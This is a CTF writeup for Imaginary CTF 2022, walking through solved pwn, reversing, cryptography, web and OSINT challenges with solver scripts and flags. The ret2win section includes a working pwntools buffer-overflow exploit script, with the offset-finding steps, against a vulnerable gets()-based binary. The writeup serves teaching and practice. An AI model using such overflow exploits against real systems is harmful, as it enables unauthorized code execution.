---
title: 'Imaginary CTF 2022'
layout: single
author_profile: true
permalink: /writeups/imaginaryctf2022
excerpt: 'Writeup for Imaginary CTF 2022 on 16 July 2022 - 19 July 2022'
toc: true
toc_sticky: true
toc_label: Challenges
---
# About
A very late writeup for Imaginary CTF 2022. The CTF was hosted from 16 July 2022 - 19 July 2022 and here are the challenges that I managed to solve.
![solved](/assets/images/imaginaryctf2022/solved.jpg)

# Pwn
## ret2win
Description: Jumping around in memory is hard. I'll give you some help so that you can pwn this!

We were given the source code, binary and a netcat command to connect to the remote server.
```c
#include <stdio.h>
#include <stdlib.h>

int win() {
  FILE *fp;
  char flag[255];
  fp = fopen("flag.txt", "r");
  fgets(flag, 255, fp);
  puts(flag);
}

char **return_address;

int main() {
  char buf[16];
  return_address = buf+24;

  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);

  puts("Welcome to ret2win!");
  puts("Right now I'm going to read in input.");
  puts("Can you overwrite the return address?");

  gets(buf);

  printf("Returning to %p...\n", *return_address);
}
```
Looking at the code, we can immediately see that the program is vulnerable to a buffer overflow due to the gets() function. Also we see that the buffer size is 16. Pulling up gdb-peda, I found the address of win, and used pattern create to create a string of length 30.
![gdb](/assets/images/imaginaryctf2022/pwn_ret2win_1.jpg)

Supplying this string to the program led to a seg fault at address 0x414144414128. Reversing this gives us (AADAA.
![fault](/assets/images/imaginaryctf2022/pwn_ret2win_2.jpg)

Using pattern offset (AADAA I know that the return address is 24 bytes away from the top of the stack. However, looking back I might not need to do these steps since in the code there is this line "return_address = buf+24".   
![pattern](/assets/images/imaginaryctf2022/pwn_ret2win_3.jpg)

With the knowledge of the address I need to jump to, and the offset I need, I can connect to the remote server using the following script.
```python
#!/usr/bin/env python

from pwn import *

payload = b"A"*24 + p64(0x4011d6)

print(payload)

host, port = "ret2win.chal.imaginaryctf.org", 1337

conn = remote(host, port)
conn.sendlineafter("Can you overwrite the return address?", payload)
conn.interactive()
```

Flag: ictf{c0ngrats_on_pwn_number_1_9b1e2f30}
# Reversing
## deserver
Description: ?galf eht teg uoy naC

We were given a python file with the following code.
```python
#!/usr/bin/env python3

cexe = exec
cexe(')]"}0p381o91_flnj_3ycvgyhz_av_tavferire{sgpv"==)]pni ni _ rof _ esle "9876543210_}{" ni ton _ fi ]_[d.siht[(nioj.""[)"tcerroc","gnorw"((tnirp;)" >>>"(tupni=pni;)"?galf eht si tahW"(tnirp;siht tropmi'[::-1])
```

It seems that the contents of the python file is reversed, and after reversing the file contents the following python code was obtained.
```python
#!/usr/bin/env python3

exec(import this;print("What is the flag?");inp=input("> ");print(("wrong","correct")["".join([this.d[_] if _ not in "{}_0123456789" else _ for _ in inp]) == "vpgs{erirefvat_va_zhygvcy3_jnlf_19o183p0}"])[::-1])
```
We can see that the code is doing some form of substitution with a dictionary this.d using the input and checking the result against the string "vpgs{erirefvat_va_zhygvcy3_jnlf_19o183p0}". Hence, we would just need to do the reverse of it which will give us the flag. Using the following code will give us the flag.
```python
import this

dict = {value:key for key,value in this.d.items()}
encrypted = "vpgs{erirefvat_va_zhygvcy3_jnlf_19o183p0}"
plaintext = ""

for i in encrypted:
    if i not in "{}_0123456789":
        plaintext += dict[i]
    else:
        plaintext += i

print(plaintext)
```

Flag: ictf{reversing_in_multipl3_ways_19b183c0}
# Cryptography
## emojis
Description: To be or not to be, that is the question. Sadly the challenge doesn't look nearly as good unless you have a fancy terminal 😦

We were given a text file with the thumbsup and thunbsdown emojis.
![emojis](/assets/images/imaginaryctf2022/crypto_emojis_1.jpg)

Learning that the coding of the thumbsdown emoji is 128078 and the thumbsup emoji is 128077, I wrote the following script to convert each emoji to either a bit '1' or bit '0'. Converting the bitstring into ascii allowed me to recover the flag.
```python
#!/usr/bin/env python3

temp = []
with open('emojis.txt', 'r') as f:
	temp = f.readlines()

temp = temp[0]
output = ''
output2 = ''

for i in temp:
    if ord(i) == 128077:
        output += '1'
	output2 += '0'
    else:
	output += '0'
	output2 += '1'

output = "".join([chr(int(output[i:i+8],2)) for i in range(0, len(output), 8)])
output2 = "".join([chr(int(output2[i:i+8],2)) for i in range(0, len(output2), 8)])

print(output)
print(output2)
```

Flag: ictf{enc0ding_is_n0t_encrypti0n_1b2e0d43}

## Secure encoding: Hex
Description: Cryptograms == encryption, right? Flag is readable English.

We were given the following python code and text file with the encrypted flag.
```python
#!/usr/bin/env python3

from random import shuffle

charset = '0123456789abcdef'
shuffled = [i for i in charset]
shuffle(shuffled)

d = {charset[i]:v for(i,v)in enumerate(shuffled)}

pt = open("flag.txt").read()
assert all(ord(i)<128 for i in pt)

ct = ''.join(d[i] for i in pt.encode().hex())
f = open('out.txt', 'w')
f.write(ct)
```
```
0d0b18001e060d090d1802131dcf011302080ccf0c070b0f080d0701cf00181116
```

The main idea behind solving this challenge is recognising that encoding "icft{" and getting the hex values will allow us to know the substituition of some characters. Take for example encoding "ictf{" will result in "696374667b". Comparing to the first 10 characters of the encrypted string "0d0b18001e", we can see that "6" -> "0", "9" -> "d", "3" -> "b" etc. Thus, to decrypt I will just need to reverse this mapping. The remaining unknown mappings can be brute forced by trying all permutations and seeing the resulting output, discarding any that will not give me a valid string. Running the script a few times, I can see some parts of the recovered flag, allowing me to further constraint the string that is displayed and only show the one which had "encoding", "grade" and "military" in it.
```python
#!/usr/bin/env python3

from random import shuffle
import itertools
charset = '0123456789abcdef'

flag = "ictf{}".encode().hex()
flag = [flag[i:i+2] for i in range(0, len(flag), 2)]

ct = "0d0b18001e060d090d1802131dcf011302080ccf0c070b0f080d0701cf00181116"

d = {'d':'6', 'b':'e', '4':'8', '7':'1', '6':'0', '9':'d', '3':'b'}
decrypt = {'6':'d', 'e':'b', '8':'4', '1':'7', '0':'6', 'd':'9', 'b':'3'}
unknown = list('234579acf')
valid = list('01258acef')

unique = []

permut = itertools.permutations(unknown, len(valid))

for comb in permut:
    zipped = zip(comb, valid)
    unique.append(list(zipped))

for c in unique:
    temp = {i[0]:i[1] for i in c}
    temp.update(decrypt)

    pt = ''.join(temp[i] for i in ct)
    try:
        pt = bytearray.fromhex(pt).decode()
        if "encoding" in pt and "grade" in pt and "military" in pt:
            print(pt)
    except:
        continue
```
Flag: ictf{military_grade_encoding_ftw}

## smoll
Description: Just a regular, run-of-the-mill RSA challenge, right? Right?

We were given the following python code and text.
```python
from secret import p, q
from sage.all import factor

for r in [p, q]:
    for s, _ in factor(r - 1):
        assert int(s).bit_length() <= 20

n = p * q
e = 0x10001

with open("flag.txt", "rb") as f:
    flag = int.from_bytes(f.read().strip(), "big")
assert flag < n

ct = pow(flag, e, n)
print(f"{n = }")
print(f"{e = }")
print(f"{ct = }")
```
```
n = 13499674168194561466922316170242276798504319181439855249990301432638272860625833163910240845751072537454409673251895471438416265237739552031051231793428184850123919306354002012853393046964765903473183152496753902632017353507140401241943223024609065186313736615344552390240803401818454235028841174032276853980750514304794215328089
e = 65537
ct = 12788784649128212003443801911238808677531529190358823987334139319133754409389076097878414688640165839022887582926546173865855012998136944892452542475239921395969959310532820340139252675765294080402729272319702232876148895288145134547288146650876233255475567026292174825779608187676620580631055656699361300542021447857973327523254
```

Since this is a RSA challenge and the challenge is titled "smoll", I guessed that the encryption can be broken due to the small n that was chosen. Using factordb, I managed to get the following p and q.
```
p = 1314503602874176261160006408736468830398552989268751172636991566212261500942084902638924872933455766527167138778836649666000256787470232570894174402457567851267
q = 10269788640120406479189208525026339199093845666673702430337969905963784688358534250752262933990966146387066526903643434702682519052982932900845447003320641632727209399667
```

With p and q recovered, all I have to do now is to reverse the RSA encryption using the following python script.
```python
from Crypto.Util.number import inverse

p = 1314503602874176261160006408736468830398552989268751172636991566212261500942084902638924872933455766527167138778836649666000256787470232570894174402457567851267
q = 10269788640120406479189208525026339199093845666673702430337969905963784688358534250752262933990966146387066526903643434702682519052982932900845447003320641632727209399667
e = 65537
ct = 12788784649128212003443801911238808677531529190358823987334139319133754409389076097878414688640165839022887582926546173865855012998136944892452542475239921395969959310532820340139252675765294080402729272319702232876148895288145134547288146650876233255475567026292174825779608187676620580631055656699361300542021447857973327523254
n = 13499674168194561466922316170242276798504319181439855249990301432638272860625833163910240845751072537454409673251895471438416265237739552031051231793428184850123919306354002012853393046964765903473183152496753902632017353507140401241943223024609065186313736615344552390240803401818454235028841174032276853980750514304794215328089

phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(ct,d,n)
print(bytearray.fromhex(hex(m)[2:]).decode())
```

Flag: ictf{wh4t_1f_w3_sh4r3d_0ur_l4rge$t_fact0r_jk_unl3ss??}
# Web
## button
Description: Apparently one of these buttons isn't useless...

We were given a link to a webpage which had nothing displayed.
![webpage](/assets/images/imaginaryctf2022/web_button_1.jpg)

Viewing the page source I see that there were alot of buttons (there was 15,009 lines in the source code itself) that triggers a function "notSusFunction()". A small snippet of the source is shown below.
```html
<style>
.not-sus-button {
  border: none;
  padding: 0;
  background: none;
  color:white;
}
</style>

<button class="not-sus-button" onclick="notSusFunction()">.</button>
<button class="not-sus-button" onclick="notSusFunction()">.</button>
<button class="not-sus-button" onclick="notSusFunction()">.</button>
<button class="not-sus-button" onclick="notSusFunction()">.</button>
<button class="not-sus-button" onclick="notSusFunction()">.</button>
```

Of course triggering the function "notSusFunction()" in the console will not give the correct flag.
![wrongFlag](/assets/images/imaginaryctf2022/web_button_2.jpg)

Instead I downloaded the source code of the web page and run the following command.
```
cat button.html | grep -v "notSusFunction()"
```

-v tag for grep does an invert-match which allow me to find lines which does not have "notSusFunction()".
![terminal](/assets/images/imaginaryctf2022/web_button_3.jpg)

Running the function "motSusFunction()" in the console will give us the correct flag.
![correctFlag](/assets/images/imaginaryctf2022/web_button_4.jpg)

Flag: ictf{y0u_f0und_7h3_f1ag!}

## rooCookie
Description: Roo seems to have left his computer on, can you find his password?

We were given a link to the following webpage.
![webpage](/assets/images/imaginaryctf2022/web_rooCookie_1.jpg)

I immediately knew that the challenge will involve something about cookies and went to check there.
![cookies](/assets/images/imaginaryctf2022/web_rooCookie_2.jpg)

However, after this I became very stuck. Although I got a binary string, decoding it does not yield any valid strings. It was until a while before I saw the source code of the webpage which included this code snippet.
```javascript
<script>
function createToken(text) {
  let encrypted = "";
  for (let i = 0; i < text.length; i++) {
	encrypted += ((text[i].charCodeAt(0)-43+1337) >> 0).toString(2)
  }
  document.cookie = encrypted
}

document.cookie = "token=101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000"
</script>
```

After knowing how the binary string was generated, reversing the entire process was straightforward using the following python code I managed to get this output username="roo" & password="ictf{h0p3_7ha7_wa5n7_t00_b4d}".
```python
#!/usr/bin/env python3

binary = "101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000"

binary = "".join([chr(int(binary[i:i+11],2)-1337+43) for i in range(0, len(binary), 11)])
print(binary)
```

Lesson learnt, always check the source code for web pages.

Flag: ictf{h0p3_7ha7_wa5n7_t00_b4d} 
# Forensics
## Journey
Description: This is an OSINT challenge. Max49 went on a trip... can you figure out where? The flag is ictf{latitude_longitude}, where both are rounded to three decimal places. For example, ictf{-95.334_53.234}

We were given this image.
![image](/assets/images/imaginaryctf2022/forensics_journey_1.jpg) 

Utilising google reverse image search on a small section of the image given, I was able to narrow down the location which is likely to be Orvieto, a city in Italy.
![section](/assets/images/imaginaryctf2022/forensics_journey_2.jpg) 

Next, I used google maps and their street view to slowly comb the streets and manage to find this place which looked very similar, and was right this was the correct place.
![place](/assets/images/imaginaryctf2022/forensics_journey_3.jpg)

Flag: ictf{42.717_12.112}

## Unpuzzled4
Description: THIS IS AN OSINT CHALLENGE. It looks like unpuzzler7 has been getting into photography recently. His pictures aren't very good though, you can't even tell what the location of the pictures are!

This particular challenge requires us to join the imaginaryctf discord server. There I managed to find a user named unpuzzler7#6451, which had a link to a flickr profile.
![unpuzzler7#6451](/assets/images/imaginaryctf2022/forensics_unpuzzled4_1.jpg)

Going to flickr we see this profile which had 2 images uploaded.
![flickr](/assets/images/imaginaryctf2022/forensics_unpuzzled4_2.jpg)

There was nothing interesting in the image with Rick Astley. Going to the other image, we can see the flag in the exif. 
![image](/assets/images/imaginaryctf2022/forensics_unpuzzled4_3.jpg)

Flag: ictf{1mgur_d03sn't_cl3ar_3xif}
